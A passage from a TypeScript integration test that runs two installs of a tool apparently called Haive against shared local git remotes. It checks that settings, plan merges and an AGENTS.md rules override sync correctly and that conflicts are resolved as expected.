    const switchedOnB = await rtkOf(b);
    const switchedFile = await readFile(path.join(b.repoPath, switchRel), 'utf8');
    const askedOnB = await askedAbout(b);
    check(
      "B's switch survives its own sync and sweep: the column stays on, no question is asked and the record file says so",
      'rows' in switchedOnB &&
        switchedOnB.rows[0]?.rtk_enabled === true &&
        switchedFile.trim() === 'true' &&
        'rows' in askedOnB &&
        askedOnB.rows.length === 0,
      { switchedOnB, switchedFile, askedOnB },
    );
    git(b.repoPath, 'add', switchRel);
    git(b.repoPath, 'commit', '-q', '--allow-empty', '-m', 'B switches RTK on');
    git(b.repoPath, 'push', '-q', 'origin', 'HEAD:main');
    git(a.repoPath, 'pull', '-q', '--ff-only', 'origin', 'main');
    await markProjectStateDirty(a.db, a.repositoryId);
    await sweepDirtyProjectStates(a.db);
    const switchedOnA = await rtkOf(a);
    const fileOnA = await readFile(path.join(a.repoPath, switchRel), 'utf8');
    const askedOnA2 = await askedAbout(a);
    check(
      "B's switch reaches A through git, and survives A's sync and sweep as the team's value, not A's own choice",
      'rows' in switchedOnA &&
        switchedOnA.rows[0]?.rtk_enabled === true &&
        switchedOnA.rows[0]?.stamped === false &&
        fileOnA.trim() === 'true' &&
        git(a.repoPath, 'status', '--porcelain', '--', switchRel) === '' &&
        'rows' in askedOnA2 &&
        askedOnA2.rows.length === 0,
      { switchedOnA, fileOnA, askedOnA2 },
    );

    // ---- a plan Pull, a Save & push and 01's confirm set Haive's pending files aside (B3.1b-1) ----
    // Each check has its own remote and pair of installs, so a failing one leaves the next a clean start.
    // B's pending change is a render.json value Haive wrote and has not committed; A's commit touches it too.
    poolB = initDatabase(urlB.toString());
    const RENDER_BASE = {
      projectInfo: { name: 'two-install-smoke' },
      framework: null,
      acceptedAgentIds: ['a'],
      customAgentSpecs: [],
      lspLanguages: [],
      rtkChoiceRecorded: true,
    };
    const attempt = async <T>(
      run: () => Promise<T>,
    ): Promise<{ value: T | null; error: string | null }> => {
      try {
        return { value: await run(), error: null };
      } catch (err) {
        return { value: null, error: err instanceof Error ? err.message : String(err) };
      }
    };
    const landing = async (label: string) => {
      const origin = path.join(tmp!, `land-${label}.git`);
      git(tmp!, 'init', '-q', '--bare', '-b', 'main', origin);
      const seedDir = path.join(tmp!, `land-${label}-seed`);
      git(tmp!, 'clone', '-q', httpOrigin(origin), seedDir);
      await writeFile(path.join(seedDir, 'README.md'), `# ${label}\n`);
      git(seedDir, 'add', 'README.md');
      git(seedDir, 'commit', '-q', '-m', 'seed');
      git(seedDir, 'push', '-q', 'origin', 'HEAD:main');
      const url = httpOrigin(origin);
      const userOfA = randomUUID();
      landUsers.push(userOfA);
      const x = await cloneInstall('A', dbA!, path.join(tmp!, `land-${label}-a`), url, userOfA);
      await x.db
        .update(schema.repositories)
        .set({ renderContext: RENDER_BASE })
        .where(eq(schema.repositories.id, x.repositoryId));
      await writeProjectStateColumn(x.db, {
        repositoryId: x.repositoryId,
        repoPath: x.repoPath,
        column: RENDER_BASE,
      });
      await applyPlanPatch(
        x.db,
        {
          ops: [
            { op: 'upsert', nodeRef: 'root', parentRef: null, title: 'Landing plan' },
            { op: 'upsert', nodeRef: 'one', parentRef: 'root', title: 'First' },
            { op: 'upsert', nodeRef: 'two', parentRef: 'root', title: 'Second' },
          ],
        },
        { repositoryId: x.repositoryId, origin: 'user' },
      );
      await writePlanMirror(x.db, x.repositoryId, x.repoPath);
      git(x.repoPath, 'add', '.haive-data/state', planFileRel, planMdRel);
      git(x.repoPath, 'commit', '-q', '-m', 'A: the record and the plan');
      git(x.repoPath, 'push', '-q', 'origin', 'HEAD:main');
      const y = await cloneInstall('B', dbB!, path.join(tmp!, `land-${label}-b`), url);
      await y.db
        .update(schema.users)
        .set({ gitName: 't', gitEmail: 't@example.com' })
        .where(eq(schema.users.id, y.userId));
      return { x, y, origin };
    };
    /** One value of the render record changed in the column and written by a sweep: dirty, uncommitted. */
    const setRender = async (install: Install, over: Record<string, unknown>) => {
      await install.db
        .update(schema.repositories)
        .set({ renderContext: { ...RENDER_BASE, ...over } })
        .where(eq(schema.repositories.id, install.repositoryId));
      await markProjectStateDirty(install.db, install.repositoryId);
      await sweepDirtyProjectStates(install.db);
    };
    const editPlan = async (install: Install, nth: number, title: string) => {
      const children = (await planOf(install)).filter((n) => n.parentId !== null);
      await applyPlanPatch(
        install.db,
        { ops: [{ op: 'upsert', nodeRef: children[nth]!.id, title }] },
        { repositoryId: install.repositoryId, origin: 'user' },
      );
    };
    const pushFrom = (install: Install, message: string, ...paths: string[]) => {
      git(install.repoPath, 'add', ...paths);
      git(install.repoPath, 'commit', '-q', '-m', message);
      git(install.repoPath, 'push', '-q', 'origin', 'HEAD:main');
      return git(install.repoPath, 'rev-parse', 'HEAD');
    };
    type Render = { acceptedAgentIds?: string[]; lspLanguages?: string[] } | null;
    const columnOf = async (install: Install): Promise<Render> => {
      const [row] = await install.db
        .select({ renderContext: schema.repositories.renderContext })
        .from(schema.repositories)
        .where(eq(schema.repositories.id, install.repositoryId));
      return (row?.renderContext ?? null) as Render;
    };
    const fileOf = async (install: Install, rel: string): Promise<string> =>
      readFile(path.join(install.repoPath, rel), 'utf8').catch(() => '');
    /** Whether the render column and render.json both hold A's agent and B's own pending language. */
    const holdsBoth = async (install: Install): Promise<boolean> => {
      const column = await columnOf(install);
      const record = JSON.parse((await fileOf(install, RECORD_RENDER)) || 'null') as Render;
      return [column, record].every(
        (r) =>
          isDeepStrictEqual(sorted(r?.acceptedAgentIds), ['a', 'b']) &&
          isDeepStrictEqual(r?.lspLanguages, ['php']),
      );
    };
    const dirtyOn = (install: Install) =>
      git(install.repoPath, 'status', '--porcelain', '--untracked-files=no');
    const contains = (install: Install, sha: string): boolean => {
      try {
        git(install.repoPath, 'merge-base', '--is-ancestor', sha, 'HEAD');
        return true;
      } catch {
        return false;
      }
    };
    /** A live merge conversation's task and step, as 01's confirm finds them. */
    const conversation = async (install: Install) => {
      const [task] = await install.db
        .insert(schema.tasks)
        .values({
          userId: install.userId,
          repositoryId: install.repositoryId,
          type: 'plan_merge',
          title: 'two-install-smoke',
          status: 'waiting_user',
        })
        .returning({ id: schema.tasks.id });
      const [step] = await install.db
        .insert(schema.taskSteps)
        .values({
          taskId: task!.id,
          stepId: planMergeStep.metadata.id,
          stepIndex: planMergeStep.metadata.index,
          title: planMergeStep.metadata.title,
          status: 'running',
        })
        .returning({ id: schema.taskSteps.id });
      const ctx = ctxFor(install, task!.id, step!.id);
      return { ctx, detect: () => planMergeStep.detect!(ctx) };
    };
    const confirm = (
      ctx: StepContext,
      detected: Parameters<typeof planMergeStep.apply>[1]['detected'],
    ) =>
      planMergeStep.apply(ctx, {
        detected,
        formValues: { decision: 'confirm' },
        iteration: 0,
        previousIterations: [],
      });
    /** Runs `start` while another session holds the merge lock, and has a sweep rewrite the record
     *  files once `start` waits for it: a write that lands between the set-aside and the move. */
    const rewrittenWhileWaiting = async <T>(install: Install, start: () => Promise<T>) => {
      let release!: () => void;
      let held!: () => void;
      const locked = new Promise<void>((r) => (held = r));
      const holder = install.db.transaction(async (tx) => {
        await lockPlanMerge(tx, install.repositoryId);
        held();
        await new Promise<void>((r) => (release = r));
      });
      await locked;
      const running = start();
      let blocked = false;
      for (let i = 0; i < 300 && !blocked; i++) {
        const waiting = await rowsOf<{ n: number }>(
          install.db,
          sql`select count(*)::int as n from pg_locks where locktype = 'advisory' and not granted and database = (select oid from pg_database where datname = current_database())`,
        );
        blocked = 'rows' in waiting && waiting.rows[0]!.n > 0;
        if (!blocked) await new Promise((r) => setTimeout(r, 100));
      }
      await sweepDirtyProjectStates(install.db);
      const rewritten = dirtyOn(install);
      release();
      await holder;
      return { blocked, rewritten, result: await running };
    };

    // ---- T119: the repository's AGENTS.md rules override rides settings/agent-rules.md (R1-R7) ----
    // An independent acceptance check of the override's round trips. A and B are in sync here, as D19
    // left them, and nothing since has touched either. A write is made the way the api makes it (the
    // column and the outbox mark in one transaction, the file written by the sweep), git carries it
    // between the installs, and the receiving side syncs through handleRefresh and answers through
    // resolveProjectStateConflict.
    {
      const RULES_REL = '.haive-data/state/settings/agent-rules.md';
      const RULES_UNIT = 'settings/agent-rules.md';
      const MARK = '<<rules region>>';
      /** What the api does for a save: the column and the outbox mark in one transaction. */
      const setRules = async (install: Install, value: string | null): Promise<void> => {
        await install.db.transaction(async (tx) => {
          await tx
            .update(schema.repositories)
            .set({ agentRulesOverride: value, updatedAt: new Date() })
            .where(eq(schema.repositories.id, install.repositoryId));
          await markProjectStateDirty(tx, install.repositoryId);
        });
      };
      const ruleCol = async (install: Install): Promise<string | null> =>
        (
          await install.db
            .select({ value: schema.repositories.agentRulesOverride })
            .from(schema.repositories)
            .where(eq(schema.repositories.id, install.repositoryId))
        )[0]?.value ?? null;
      const ruleFile = (install: Install): Promise<string | null> =>
        readFile(path.join(install.repoPath, RULES_REL), 'utf8').then(
          (text) => text,
          () => null,
        );
      const agentsOf = (install: Install): Promise<string> =>
        readFile(path.join(install.repoPath, 'AGENTS.md'), 'utf8');
      const regionIn = async (install: Install): Promise<string | null> =>
        regionOf(await agentsOf(install));
      /** AGENTS.md with its rules region replaced by a placeholder: what a rules change must leave alone. */
      const outsideRegion = (text: string): string => {
        const region = extractRegion(text, CLI_RULES_START, CLI_RULES_END);
        return region === null ? text : text.replace(region, MARK);
      };
      const isRulesEntry = (e: { diskPath: string; templateKind: string }): boolean =>
        e.diskPath === CLI_RULES_DISK_PATH && e.templateKind === CLI_RULES_TEMPLATE_KIND;
      const bucketsOf = (plan: UpgradePlanDetect | null): string[] =>
        (plan?.entries ?? []).filter(isRulesEntry).map((e) => e.bucket);
      const idsOf = (plan: UpgradePlanDetect, bucket: string): string[] =>
        plan.entries.filter((e) => isRulesEntry(e) && e.bucket === bucket).map((e) => e.entryId);
      /** Applies the rules region’s entry alone: every plan here also holds entries of the checks above
       *  this block (agents the shared record names that nobody has written), which are not its own. */
      const applyRegion = (install: Install) =>
        upgradeApplied(install, (plan) => ({
          selectedUpdates: idsOf(plan, 'clean_update'),
          selectedNew: idsOf(plan, 'new_artifact'),
          selectedObsoleteRemovals: idsOf(plan, 'obsolete'),
        }));
      /** The entries of a plan that are not the rules region’s and are not quiet. */
      const noiseOf = (plan: UpgradePlanDetect | null): string[] =>
        (plan?.entries ?? [])
          .filter((e) => !isRulesEntry(e) && e.bucket !== 'unchanged')
          .map((e) => `${e.diskPath}: ${e.bucket}`)
          .sort();
      /** A plan that leaves no live upgrade task behind, since a live one makes the sync defer. */
      const planOnly = async (install: Install) => {
        const planned = await upgradePlan(install);
        await install.db
          .update(schema.tasks)
          .set({ status: 'cancelled' })
          .where(eq(schema.tasks.id, planned.taskId));
        return planned;
      };
      /** Every file of the record in a checkout, by path below `.haive-data/state`. */
      const treeOf = async (install: Install): Promise<Map<string, string>> => {
        const root = path.join(install.repoPath, '.haive-data/state');
        const files = new Map<string, string>();
        for (const entry of await readdir(root, { recursive: true, withFileTypes: true })) {
          if (!entry.isFile()) continue;
          const abs = path.join(entry.parentPath, entry.name);
          files.set(path.relative(root, abs), await readFile(abs, 'utf8'));
        }
        return files;
      };
      /** The record files the two checkouts do not hold identically, by path. The bundles directory is
       *  left out: A alone holds the custom bundle of its onboarding, whose descriptor its sweep writes
       *  and nobody commits, which has nothing to do with the rules. */
      const treesDiffer = async (x: Install, y: Install): Promise<string[]> => {
        const [left, right] = [await treeOf(x), await treeOf(y)];
        return [...new Set([...left.keys(), ...right.keys()])]
          .filter((rel) => !rel.startsWith('bundles/') && left.get(rel) !== right.get(rel))
          .sort();
      };
      interface Question {
        id: string;
        local: { v: unknown } | null;
        incoming: { v: unknown } | null;
        resolved_at: Date | null;
        resolution: string | null;
      }
      /** The questions asked about the rules, all of them and the ones still open. */
      const questionsOf = async (
        install: Install,
      ): Promise<{ all: Question[]; open: Question[] } | null> => {
        const got = await rowsOf<Question>(
          install.db,
          sql`select id, local, incoming, resolved_at, resolution from project_state_conflicts
            where repository_id = ${install.repositoryId} and unit = ${RULES_UNIT}
            order by detected_at, id`,
        );
        return 'rows' in got
          ? { all: got.rows, open: got.rows.filter((r) => r.resolved_at === null) }
          : null;
      };
      /** Every unit the install has an open question about. */
      const openUnitsOf = async (install: Install): Promise<string[] | null> => {
        const got = await rowsOf<{ unit: string }>(
          install.db,
          sql`select unit from project_state_conflicts where repository_id = ${install.repositoryId}
            and resolved_at is null order by unit`,
        );
        return 'rows' in got ? got.rows.map((r) => r.unit) : null;
      };
      /** `last_error` of the install's sync row; undefined where there is no row. */
      const syncErrorOf = async (install: Install): Promise<string | null | undefined> => {
        const got = await rowsOf<{ last_error: string | null }>(
          install.db,
          sql`select last_error from project_state_sync where repository_id = ${install.repositoryId}`,
        );
        return 'rows' in got && got.rows.length === 1 ? got.rows[0]!.last_error : undefined;
      };
      const statusOn = (install: Install, ...paths: string[]): string =>
        git(install.repoPath, 'status', '--porcelain', '--', ...paths);
      const syncOnce = (install: Install) =>
        syncProjectStateFromCheckout(install.db, {
          repositoryId: install.repositoryId,
          repoPath: install.repoPath,
        });
      /** A mark and one sweep tick: what writes the record files after any trigger. */
      const sweepOnce = async (install: Install): Promise<void> => {
        await markProjectStateDirty(install.db, install.repositoryId);
        await sweepDirtyProjectStates(install.db);
      };
      const answerOn = (
        install: Install,
        conflictId: string,
        answer: 'keep_mine' | 'take_theirs',
      ) =>
        resolveProjectStateConflict(install.db, {
          repositoryId: install.repositoryId,
          userId: install.userId,
          conflictId,
          answer,
        });
      const admissionOn = async (install: Install) => {
        const [repo] = await install.db
          .select({
            id: schema.repositories.id,
            source: schema.repositories.source,
            renderContext: schema.repositories.renderContext,
            status: schema.repositories.status,
            storagePath: schema.repositories.storagePath,
            localPath: schema.repositories.localPath,
            onboardedAt: schema.repositories.onboardedAt,
            onboardingResetAt: schema.repositories.onboardingResetAt,
          })
          .from(schema.repositories)
          .where(eq(schema.repositories.id, install.repositoryId));
        return repo ? upgradeAdmission(install.db, install.userId, repo) : null;
      };
      /** The first line of Haive’s default rules: a region that carries it follows the default. */
      const defaultFirstLine =
        DEFAULT_AGENT_RULES.split('\n').find((line) => line.trim() !== '') ?? '';
      const regionOfBlock = (value: string | null): string | null => {
        const block = buildRepoCliRulesBlock(value);
        return block === null ? null : normalizeContent(block);
      };

      // A fresh clone of the remote as it stands offers what every plan here offers beyond the region.
      const baselineClone = await cloneInstall(
        'B',
        dbB!,
        path.join(tmp!, 'storage-t119-baseline'),
        remoteUrl,
        undefined,
        B_PROVIDERS,
      );
      const baselineNoise = noiseOf((await planOnly(baselineClone)).plan);

      // R1: with the override NULL there is no file, both columns are NULL and both regions are the default.
      const startTrees = await treesDiffer(a, b);
      check(
        'T119 R1: with the override NULL neither checkout holds settings/agent-rules.md, both columns are NULL and both rules regions are the default block',
        (await ruleCol(a)) === null &&
          (await ruleCol(b)) === null &&
          (await lstatNoFollow(a.repoPath, RULES_REL)) === null &&
          (await lstatNoFollow(b.repoPath, RULES_REL)) === null &&
          (await regionIn(a)) === defaultRegion &&
          (await regionIn(b)) === defaultRegion &&
          git(a.repoPath, 'rev-parse', 'HEAD') === git(b.repoPath, 'rev-parse', 'HEAD'),
        {
          a: await ruleCol(a),
          b: await ruleCol(b),
          fileA: await ruleFile(a),
          fileB: await ruleFile(b),
        },
      );
      // R1: the two record directories start byte-identical (bundles/ aside, see treesDiffer), so a later difference is the rules'.
      check(
        'T119 R1: .haive-data/state/ is byte-identical in both checkouts before any rules change',
        startTrees.length === 0,
        startTrees,
      );

      // R2: CRLF and trailing spaces are normalised, and the sweep writes exactly the normalised text.
      const RAW_X =
        '# Rules set on A\r\n\r\n- Keep changes small.   \r\n- Run the linter first.  \r\n';
      const TEXT_X = '# Rules set on A\n\n- Keep changes small.\n- Run the linter first.\n';
      const normalizedX = normalizeAgentRulesOverride(RAW_X);
      await setRules(a, normalizedX.ok ? normalizedX.value : null);
      await sweepDirtyProjectStates(a.db);
      check(
        'T119 R2: a multi-line override with CRLF and trailing spaces is stored normalised, and after A’s sweep the file holds that text byte for byte',
        normalizedX.ok &&
          normalizedX.value === TEXT_X &&
          (await ruleCol(a)) === TEXT_X &&
          (await ruleFile(a)) === TEXT_X &&
          (await clean()),
        { normalizedX, column: await ruleCol(a), file: await ruleFile(a) },
      );
      const agentsBeforeX = await agentsOf(a);
      const planAX = await planOnly(a);
      // R2: A’s 01 plan offers the region as a clean update, since only its render changed.
      check(
        'T119 R2: A’s 01 plan offers the rules region as a clean update',
        planAX.plan !== null && isDeepStrictEqual(bucketsOf(planAX.plan), ['clean_update']),
        planAX.error ?? bucketsOf(planAX.plan),
      );
      const upgradedX = await applyRegion(a);
      const agentsAfterX = await agentsOf(a);
      const wantX = regionOfBlock(TEXT_X);
      // R2: 01+02 rewrite the region to buildRepoCliRulesBlock(value) and nothing around it.
      check(
        'T119 R2: A’s 01+02 upgrade rewrites the region to buildRepoCliRulesBlock(value) and leaves the text around it unchanged',
        upgradedX.error === null &&
          wantX !== null &&
          regionOf(agentsAfterX) === wantX &&
          (regionOf(agentsAfterX) ?? '').includes('- Run the linter first.\n') &&
          !(regionOf(agentsAfterX) ?? '').includes(defaultFirstLine) &&
          outsideRegion(agentsAfterX) === outsideRegion(agentsBeforeX),
        {
          error: upgradedX.error,
          ...departure(regionOf(agentsAfterX), wantX ?? ''),
          outsideKept: outsideRegion(agentsAfterX) === outsideRegion(agentsBeforeX),
        },
      );
      pushFrom(a, 'A: the AGENTS.md rules override', 'AGENTS.md', '.haive-data/state');
      await refresh(b, 'storage-b');
      const planBX = await planOnly(b);
      // R2: B imports A’s value from the pushed file.
      check(
        'T119 R2: B refreshes and syncs: its column is A’s value and its file holds it',
        (await ruleCol(b)) === TEXT_X && (await ruleFile(b)) === TEXT_X,
        { column: await ruleCol(b), file: await ruleFile(b) },
      );
      // R2: B has nothing to offer for the region, since A’s claim travelled with the value.
      check(
        'T119 R2: B’s 01 plan is quiet for AGENTS.md: the rules region reads unchanged',
        planBX.plan !== null && isDeepStrictEqual(bucketsOf(planBX.plan), ['unchanged']),
        planBX.error ?? bucketsOf(planBX.plan),
      );
      // R2: the region reads the same in both checkouts, and is the repository-level block.
      check(
        'T119 R2: the region bytes in both checkouts are identical and are buildRepoCliRulesBlock(value)',
        wantX !== null &&
          (await regionIn(a)) === wantX &&
          (await regionIn(b)) === wantX &&
          (await agentsOf(a)) === (await agentsOf(b)),
        { a: await regionIn(a), b: await regionIn(b), want: wantX },
      );

      // R3: an explicit empty override is a 0-byte file, which is not an absent one.
      await setRules(a, '');
      await sweepDirtyProjectStates(a.db);
      const emptyOnA = await stat(path.join(a.repoPath, RULES_REL)).catch(() => null);
      check(
        'T119 R3: A sets the empty override: a 0-byte settings/agent-rules.md exists and the column is the empty string, not NULL',
        emptyOnA !== null &&
          emptyOnA.isFile() &&
          emptyOnA.size === 0 &&
          (await ruleCol(a)) === '' &&
          (await clean()),
        { size: emptyOnA?.size, column: await ruleCol(a) },
      );
      pushFrom(a, 'A: an explicit empty rules override', '.haive-data/state');
      await refresh(b, 'storage-b');
      const emptyOnB = await stat(path.join(b.repoPath, RULES_REL)).catch(() => null);
      const planBE = await planOnly(b);
      // R3: the empty text travels as a 0-byte file and is imported as '' (which is not NULL).
      check(
        'T119 R3: B imports the empty override: its column is the empty string and not NULL, and its file is 0 bytes',
        (await ruleCol(b)) === '' && emptyOnB !== null && emptyOnB.size === 0,
        { column: await ruleCol(b), size: emptyOnB?.size },
      );
      // R3: an empty override renders no block at all, so the region B holds is obsolete.
      check(
        'T119 R3: B’s plan offers the rules region as obsolete',
        planBE.plan !== null && isDeepStrictEqual(bucketsOf(planBE.plan), ['obsolete']),
        planBE.error ?? bucketsOf(planBE.plan),
      );
      const agentsBeforeE = await agentsOf(b);
      const removedOnB = await applyRegion(b);
      const agentsAfterE = await agentsOf(b);
      const linesOf = (text: string): string[] =>
        text.split('\n').filter((line) => line.trim() !== '');
      // R3: applying the removal takes the region out of B and keeps every other line.
      check(
        'T119 R3: applying it removes the region in B and keeps the lines around it',
        removedOnB.error === null &&
          extractRegion(agentsAfterE, CLI_RULES_START, CLI_RULES_END) === null &&
          isDeepStrictEqual(
            linesOf(agentsAfterE),
            linesOf(outsideRegion(agentsBeforeE)).filter((line) => line !== MARK),
          ),
        { error: removedOnB.error, after: linesOf(agentsAfterE) },
      );
      pushFrom(b, 'B: the rules region removed', 'AGENTS.md', '.haive-data/state');
      await refresh(a, 'storage-a');
      const planAE = await planOnly(a);
      const removedOnA = await applyRegion(a);
      // R3: B’s removal reaches A through git, and A applying its own plan leaves the region removed.
      check(
        'T119 R3: the region stays removed in A after A applies too, and AGENTS.md is the same file in both checkouts',
        removedOnA.error === null &&
          bucketsOf(planAE.plan).every((bucket) => bucket === 'obsolete') &&
          (await regionIn(a)) === null &&
          (await agentsOf(a)) === (await agentsOf(b)) &&
          statusOn(a, 'AGENTS.md') === '',
        {
          error: removedOnA.error,
          planned: bucketsOf(planAE.plan),
          status: statusOn(a, 'AGENTS.md'),
        },
      );

      await setRules(a, null);
      await sweepDirtyProjectStates(a.db);
      // R3: NULL is no file at all: the sweep deletes the one it had written.
      check(
        'T119 R3: A sets NULL: the file is removed from the checkout and the column is NULL',
        (await ruleFile(a)) === null &&
          (await ruleCol(a)) === null &&
          statusOn(a, RULES_REL) === `D ${RULES_REL}`,
        { file: await ruleFile(a), status: statusOn(a, RULES_REL) },
      );
      pushFrom(a, 'A: the rules override reset to the default', '.haive-data/state');
      await refresh(b, 'storage-b');
      const planBN = await planOnly(b);
      // R3: deleting the file on one install resets the other to the default, which is NULL, not ''.
      check(
        'T119 R3: B imports the reset: its column is NULL and not the empty string, and it holds no file',
        (await ruleCol(b)) === null && (await ruleFile(b)) === null,
        { column: await ruleCol(b), file: await ruleFile(b) },
      );
      const defaultEntry = planBN.plan?.entries.find(isRulesEntry);
      // R3: the default block is then offered back as a new artifact.
      check(
        'T119 R3: B’s next plan offers the default region back as new_artifact',
        planBN.plan !== null &&
          isDeepStrictEqual(bucketsOf(planBN.plan), ['new_artifact']) &&
          defaultEntry?.newContent != null &&
          normalizeContent(defaultEntry.newContent) === defaultRegion,
        planBN.error ?? { buckets: bucketsOf(planBN.plan), new: defaultEntry?.newContent },
      );
      const restoredOnB = await applyRegion(b);
      pushFrom(b, 'B: the default rules region back', 'AGENTS.md', '.haive-data/state');
      await refresh(a, 'storage-a');
      // R3: applying the offer restores the region, which reaches A: both are on the default again.
      check(
        'T119 R3: applying the offer puts the default region back in B and it reaches A, whose column is NULL as well',
        restoredOnB.error === null &&
          (await regionIn(b)) === defaultRegion &&
          (await regionIn(a)) === defaultRegion &&
          (await ruleCol(a)) === null &&
          (await agentsOf(a)) === (await agentsOf(b)) &&
          (await treesDiffer(a, b)).length === 0,
        { error: restoredOnB.error, trees: await treesDiffer(a, b) },
      );

      // R4: two installs set different texts from the common base both are on now.
      const X1 = '# Rules set on A, round one\n\n- Only A holds this rule.\n';
      const Y1 = '# Rules set on B, round one\n\n- Only B holds this rule.\n';
      await setRules(a, X1);
      await sweepDirtyProjectStates(a.db);
      pushFrom(a, 'A: concurrent rules, round one', '.haive-data/state');
      await setRules(b, Y1);
      await refresh(b, 'storage-b');
      const askedB1 = await questionsOf(b);
      const openUnitsB1 = await openUnitsOf(b);
      // R4: the refresh meets A’s value over B’s own: one question about the rules and no other.
      check(
        'T119 R4: B refreshes onto A’s different value: exactly one open question about settings/agent-rules.md, and no other',
        askedB1 !== null &&
          askedB1.all.length === 1 &&
          askedB1.open.length === 1 &&
          isDeepStrictEqual(openUnitsB1, [RULES_UNIT]),
        { askedB1, openUnitsB1 },
      );
      // R4: B’s own value stays in the column and the file shows the incoming side until it is answered.
      check(
        'T119 R4: B’s column still holds B’s value while its file shows A’s (the incoming side)',
        (await ruleCol(b)) === Y1 && (await ruleFile(b)) === X1,
        { column: await ruleCol(b), file: await ruleFile(b) },
      );
      const admissionB1 = await admissionOn(b);
      const planB1 = await planOnly(b);
      const regionEntryB1 = planB1.plan?.entries.find(isRulesEntry);
      // R4: unlike a claim or the render context, a rules question holds no upgrade, and the plan renders from B’s own column.
      check(
        'T119 R4: the question does not hold an upgrade: B is still admitted to one and plans the region from its own column, not from the incoming file',
        admissionB1 !== null &&
          admissionB1.admitted &&
          planB1.plan !== null &&
          isDeepStrictEqual(bucketsOf(planB1.plan), ['clean_update']) &&
          regionEntryB1?.newContent != null &&
          normalizeContent(regionEntryB1.newContent) === regionOfBlock(Y1),
        { admissionB1, error: planB1.error, buckets: bucketsOf(planB1.plan) },
      );
      const kept1 = await answerOn(b, askedB1?.open[0]?.id ?? '', 'keep_mine');
      const afterKeep1 = await questionsOf(b);
      // R4: keep mine closes the row, keeps the column and writes B’s value into the file.
      check(
        'T119 R4: B answers keep_mine: the row closes as keep_mine, the column stays B’s and B’s value goes to the file',
        kept1.kind === 'resolved' &&
          afterKeep1 !== null &&
          afterKeep1.open.length === 0 &&
          afterKeep1.all.length === 1 &&
          afterKeep1.all[0]!.resolution === 'keep_mine' &&
          (await ruleCol(b)) === Y1 &&
          (await ruleFile(b)) === Y1,
        { kept1, afterKeep1, column: await ruleCol(b), file: await ruleFile(b) },
      );
      pushFrom(b, 'B: keeps its rules, round one', '.haive-data/state');
      await refresh(a, 'storage-a');
      const askedA1 = await questionsOf(a);
      const openUnitsA1 = await openUnitsOf(a);
      // R4: A held no change of its own since it pushed, so B’s kept value is a one-sided change to A, as for the render setting (B1.5b): A takes it and is asked nothing.
      check(
        'T119 R4: A refreshes onto B’s pushed answer: A is asked nothing and its column and file take B’s kept value',
        askedA1 !== null &&
          askedA1.all.length === 0 &&
          isDeepStrictEqual(openUnitsA1, []) &&
          (await ruleCol(a)) === Y1 &&
          (await ruleFile(a)) === Y1,
        { askedA1, openUnitsA1, column: await ruleCol(a), file: await ruleFile(a) },
      );
      const [syncA1, syncB1] = [await syncOnce(a), await syncOnce(b)];
      const [repeatA1, repeatB1] = [await questionsOf(a), await questionsOf(b)];
      const differing1 = await treesDiffer(a, b);
      // R4: repeating the sync on both changes nothing: no new question and the record files agree byte for byte.
      check(
        'T119 R4: repeating the sync on both finds nothing to ask: no new question on either install and .haive-data/state/ is byte-identical in both checkouts',
        syncA1.outcome === 'unchanged' &&
          syncB1.outcome === 'unchanged' &&
          repeatA1 !== null &&
          repeatA1.all.length === 0 &&
          repeatB1 !== null &&
          repeatB1.all.length === 1 &&
          repeatB1.open.length === 0 &&
          differing1.length === 0,
        { syncA1, syncB1, repeatA1, repeatB1, differing1 },
      );

      // R4 mirror: from the common base both hold now, B answers take_theirs instead and converges on A’s value.
      const X2 = '# Rules set on A, round two\n\n- A rule only A holds in round two.\n';
      const Y2 = '# Rules set on B, round two\n\n- A rule only B holds in round two.\n';
      await setRules(a, X2);
      await sweepDirtyProjectStates(a.db);
      pushFrom(a, 'A: concurrent rules, round two', '.haive-data/state');
      await setRules(b, Y2);
      await refresh(b, 'storage-b');
      const askedB2 = await questionsOf(b);
      // R4 mirror: the same unit is asked again, with the first answer kept as closed history.
      check(
        'T119 R4 mirror: the second concurrent change opens a new question on B beside the closed one, B’s column stays B’s and its file shows A’s',
        askedB2 !== null &&
          askedB2.all.length === 2 &&
          askedB2.open.length === 1 &&
          askedB2.all.some((q) => q.resolution === 'keep_mine') &&
          (await ruleCol(b)) === Y2 &&
          (await ruleFile(b)) === X2,
        { askedB2, column: await ruleCol(b), file: await ruleFile(b) },
      );
      const took2 = await answerOn(b, askedB2?.open[0]?.id ?? '', 'take_theirs');
      const afterTake2 = await questionsOf(b);
      const syncB2 = await syncOnce(b);
      // R4 mirror: take theirs applies A’s value to B’s column; the file already holds it, so B has nothing to push.
      check(
        'T119 R4 mirror: B answers take_theirs and converges on A’s value: the column and the file agree, the row closes, nothing is left to push',
        took2.kind === 'resolved' &&
          afterTake2 !== null &&
          afterTake2.open.length === 0 &&
          afterTake2.all.some((q) => q.resolution === 'take_theirs') &&
          (await ruleCol(b)) === X2 &&
          (await ruleFile(b)) === X2 &&
          syncB2.outcome === 'unchanged' &&
          statusOn(b, RULES_REL) === '',
        { took2, afterTake2, syncB2, status: statusOn(b, RULES_REL) },
      );
      await refresh(a, 'storage-a');
      const [syncA2, repeatA2] = [await syncOnce(a), await questionsOf(a)];
      // R4 mirror: A, which was never asked, holds its own value and the record directories are identical.
      check(
        'T119 R4 mirror: A holds its value and no question, and .haive-data/state/ is byte-identical in both checkouts',
        (await ruleCol(a)) === X2 &&
          syncA2.outcome === 'unchanged' &&
          repeatA2 !== null &&
          repeatA2.all.length === 0 &&
          (await treesDiffer(a, b)).length === 0,
        { column: await ruleCol(a), syncA2, repeatA2, trees: await treesDiffer(a, b) },
      );

      // R4 role swap: B pushes first and A holds an unswept change of its own, so A is the install asked.
      const X3 = '# Rules set on A, round three\n\n- A rule only A holds in round three.\n';
      const Y3 = '# Rules set on B, round three\n\n- A rule only B holds in round three.\n';
      await setRules(b, Y3);
      await sweepDirtyProjectStates(b.db);
      pushFrom(b, 'B: concurrent rules, round three', '.haive-data/state');
      await setRules(a, X3);
      await refresh(a, 'storage-a');
      const askedA3 = await questionsOf(a);
      // R4 role swap: the install that refreshes second with a change of its own is the one asked.
      check(
        'T119 R4 role swap: A refreshes onto B’s different value with a change of its own: one open question, A’s column stays A’s and its file shows B’s',
        askedA3 !== null &&
          askedA3.all.length === 1 &&
          askedA3.open.length === 1 &&
          (await ruleCol(a)) === X3 &&
          (await ruleFile(a)) === Y3,
        { askedA3, column: await ruleCol(a), file: await ruleFile(a) },
      );
      const took3 = await answerOn(a, askedA3?.open[0]?.id ?? '', 'take_theirs');
      const afterTake3 = await questionsOf(a);
      await sweepDirtyProjectStates(a.db);
